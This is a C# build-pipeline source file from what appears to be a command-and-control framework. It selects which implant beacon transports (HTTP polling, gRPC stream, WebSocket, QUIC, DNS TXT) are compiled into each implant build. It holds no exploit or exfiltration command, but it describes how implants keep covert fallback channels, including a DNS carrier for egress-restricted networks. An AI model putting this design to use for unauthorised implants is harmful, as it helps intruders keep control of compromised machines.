namespace Rod.BuildPipeline.PayloadBuild;

/// <summary>
/// The check-in mode wire values a build profile bakes (the same strings the
/// implant's Config normalizes): "stream" holds a connection open, "poll"
/// cycles. The web URL shape splits by it -- stream dials the WebSocket
/// beacon, poll runs the envelope POST cycle.
/// </summary>
public static class CheckInModes
{
    public const string Stream = "stream";
    public const string Poll = "poll";
}

/// <summary>
/// The check-in modules a build compiles in (architecture.md Sec 8): one
/// flag per implant-side client the bake-time trim can include.
/// </summary>
[Flags]
public enum CheckInModules
{
    None = 0,

    /// <summary>
    /// The envelope POST cycle client (the implant's EnvelopeBeacon): serves
    /// walk entries whose beacon URL is a schemed http(s) front on a
    /// poll-mode bake.
    /// </summary>
    Web = 1,

    /// <summary>
    /// The mTLS gRPC stream client (the implant's Beacon): serves walk
    /// entries whose beacon URL is a bare host:port.
    /// </summary>
    Stream = 2,

    /// <summary>
    /// The WebSocket stream client (the implant's WsBeacon): serves walk
    /// entries whose beacon URL is a schemed http(s) front on a stream-mode
    /// bake -- the web posture's interactive tier.
    /// </summary>
    WebSocket = 4,

    /// <summary>
    /// The QUIC stream client (the implant's QuicBeacon): serves walk entries
    /// whose beacon URL is quic-schemed -- the duplex socket family's live
    /// session, whatever the baked mode.
    /// </summary>
    Quic = 8,

    /// <summary>
    /// The DNS check-in client (the implant's DnsCheckIn): serves walk
    /// entries whose beacon URL is dns-schemed -- the egress-restricted
    /// TXT carrier, a poll cycle whatever the baked mode.
    /// </summary>
    Dns = 16,
}

/// <summary>
/// One check-in module's bake-time descriptor: everything the trim needs to
/// know about a carrier's implant-side client -- which module flag it is,
/// which source files carry it in the implant tree, which beacon URL shapes
/// (and mode) it serves, and the factory line the generated transport
/// selection names. A carrier arriving later registers a descriptor here
/// instead of editing switches; the same shape is the seam an out-of-tree
/// carrier contributes through (its provider on the server side, its module
/// descriptor and sources on the implant side).
/// </summary>
public sealed record CheckInModuleDescriptor(
    CheckInModules Module,
    string[] Files,
    Func<string, string, bool> Serves,
    string FactoryLine);

/// <summary>
/// The registered check-in modules. Matching order is load-bearing: the
/// shapes are disjoint except the stream descriptor's bare host:port
/// fallthrough, which must sit last so a schemed or quic or dns entry never
/// falls into it.
/// </summary>
public static class CheckInModuleRegistry
{
    private static readonly CheckInModuleDescriptor[] Descriptors =
    {
        new(
            CheckInModules.Web,
            ["Internal/EnvelopeBeacon.cs", "Internal/WebCheckIn.cs"],
            (url, mode) => IsWebBeaconUrl(url) && mode != CheckInModes.Stream,
            "        WebCheckIn.Create(setup),"),
        new(
            CheckInModules.WebSocket,
            ["Internal/WsBeacon.cs"],
            (url, mode) => IsWebBeaconUrl(url) && mode == CheckInModes.Stream,
            "        WsCheckIn.Create(setup),"),
        new(
            CheckInModules.Quic,
            ["Internal/QuicCheckIn.cs"],
            (url, _) => IsQuicBeaconUrl(url),
            "        QuicCheckIn.Create(setup),"),
        new(
            CheckInModules.Dns,
            ["Internal/DnsCheckIn.cs"],
            (url, _) => IsDnsBeaconUrl(url),
            "        DnsCheckIn.Create(setup),"),
        new(
            CheckInModules.Stream,
            ["Internal/Beacon.cs", "Internal/StreamCheckIn.cs"],
            (_, _) => true,
            "        StreamCheckIn.Create(setup),"),
    };

    public static IReadOnlyList<CheckInModuleDescriptor> All => Descriptors;

    // The implant's BeaconUrl.IsWeb, mirrored: a beacon URL naming a web
    // front (a schemed http(s) URL) carries the envelope POST cycle or the
    // WebSocket beacon by the baked mode. Kept in textual lockstep with the
    // implant's predicate -- the wire-side test pins both.
    private static bool IsWebBeaconUrl(string beaconUrl)
        => beaconUrl.Trim().StartsWith("http://", StringComparison.OrdinalIgnoreCase)
           || beaconUrl.Trim().StartsWith("https://", StringComparison.OrdinalIgnoreCase);

    // The implant's BeaconUrl.IsQuic, mirrored: a quic-schemed beacon URL is
    // the QUIC stream's dial shape. Kept in textual lockstep with the
    // implant's predicate -- the wire-side test pins both.
    private static bool IsQuicBeaconUrl(string beaconUrl)
        => beaconUrl.Trim().StartsWith("quic://", StringComparison.OrdinalIgnoreCase);

    // The implant's BeaconUrl.IsDns, mirrored: a dns-schemed beacon URL is
    // the DNS carrier's dial shape (a resolver and a zone). Kept in textual
    // lockstep with the implant's predicate -- the wire-side test pins both.
    private static bool IsDnsBeaconUrl(string beaconUrl)
        => beaconUrl.Trim().StartsWith("dns://", StringComparison.OrdinalIgnoreCase);
}

/// <summary>
/// The bake-time transport trim (architecture.md Sec 6, Sec 8): selects
/// which check-in modules an implant-class build compiles and rewrites the
/// staging copy accordingly. The selection walks the registry's descriptors
/// per egress entry -- the first descriptor whose shape (and mode) serves
/// the URL claims it -- applied to the primary and each fallback, so the
/// compiled set is precisely the set of shapes the artifact can dial and
/// never smaller.
/// </summary>
/// <remarks>
/// The trim is whole source files: the unselected modules' files leave the
/// staging copy's compilation, and a generated selection file replaces the
/// checked-in TransportSelection stub naming only the compiled factories --
/// the same replace-a-stub generation BakedProfile.cs and the extension
/// registrations use. The gRPC generation rides along through the implant
/// csproj's RodGrpcServices switch (message types only when no stream module
/// compiles), which also drops the Grpc.Net.Client reference: a web-shaped
/// artifact links no gRPC client code at all, and a stream-shaped one keeps
/// the full client. The stager tree is never trimmed: it fetches over plain
/// HTTP and carries no check-in clients.
/// </remarks>
public static class TransportModuleSelection
{
    /// <summary>
    /// Selects the check-in modules a profile's baked egress walk needs: the
    /// primary entry's beacon URL (the named beacon endpoint, else the one
    /// derived from the enroll endpoint -- the same value
    /// <c>RenderBakedProfile</c> bakes as <c>beaconURL</c>) plus each
    /// fallback's derived URL, each claimed by the first registry descriptor
    /// that serves its shape (and mode). A walk that can cross shapes (a
    /// stream primary with web fallbacks) keeps every client it can dial, so
    /// no bake ever strands the artifact on an entry it cannot run.
    /// </summary>
    public static CheckInModules Select(TransportProfile profile, string mode)
    {
        var modules = CheckInModules.None;
        Consider(profile.BeaconEndpoint ?? DotNetBuildUnit.BeaconUrlFromEnroll(profile.Endpoint));
        foreach (var fallback in profile.FallbackEndpoints)
            Consider(DotNetBuildUnit.BeaconUrlFromEnroll(fallback));
        return modules;

        void Consider(string beaconUrl)
        {
            foreach (var descriptor in CheckInModuleRegistry.All)
            {
                if (!descriptor.Serves(beaconUrl, mode))
                    continue;
                modules |= descriptor.Module;
                return;
            }
        }
    }

    /// <summary>
    /// Whether the compilation needs the generated gRPC client (and with it
    /// the Grpc.Net.Client reference): only a walk with a stream-shaped
    /// entry dials one.
    /// </summary>
    public static bool NeedsGrpcClient(CheckInModules modules)
        => (modules & CheckInModules.Stream) != 0;

    /// <summary>
    /// Rewrites the staging copy of the implant tree to carry exactly the
    /// selected modules: each unselected descriptor's source files are
    /// deleted whole, and the generated TransportSelection replaces the
    /// checked-in stub naming only the compiled factories. A set of
    /// <see cref="CheckInModules.None"/> is refused -- a primary entry always
    /// exists, so an empty set means the caller, not the profile, is wrong.
    /// </summary>
    public static void Apply(string stagingDir, CheckInModules modules)
    {
        if (modules == CheckInModules.None)
            throw new InvalidOperationException(
                "A build must compile at least one check-in module; the egress walk's primary entry always has a shape.");

        foreach (var descriptor in CheckInModuleRegistry.All)
        {
            if ((modules & descriptor.Module) != 0)
                continue;
            foreach (var file in descriptor.Files)
                File.Delete(Path.Combine(stagingDir, file));
        }

        File.WriteAllText(Path.Combine(stagingDir, SelectionFile), RenderSelection(modules));
    }

    // The generated selection replaces this checked-in stub, relative to the
    // implant tree root. The stub names every module so the dev tree runs
    // against any URL shape.
    private const string SelectionFile = "Internal/TransportSelection.cs";

    // Renders the per-build TransportSelection: same shape as the checked-in
    // stub, naming only the compiled factories in registry order. The
    // implant's Program hands this array to its check-in coordinator, which
    // picks per URL shape and mode at run time -- with one module compiled
    // the pick is constant, with several (a shape-crossing walk) it follows
    // the walk exactly as the dev tree does.
    private static string RenderSelection(CheckInModules modules)
    {
        var factories = new List<string>();
        foreach (var descriptor in CheckInModuleRegistry.All)
            if ((modules & descriptor.Module) != 0)
                factories.Add(descriptor.FactoryLine);
        return
            "// <auto-generated> Generated by Rod.DotNetBuildUnit at build time.\n"
            + "// The check-in modules this artifact compiles (architecture.md Sec 8),\n"
            + "// selected from the baked egress walk's URL shapes.\n"
            + "namespace Rod.Implant.Internal;\n\n"
            + "internal static class TransportSelection\n"
            + "{\n"
            + "    public static ICheckInClient[] CreateClients(CheckInSetup setup) =>\n"
            + "    [\n"
            + string.Join("\n", factories) + "\n"
            + "    ];\n"
            + "}\n";
    }
}
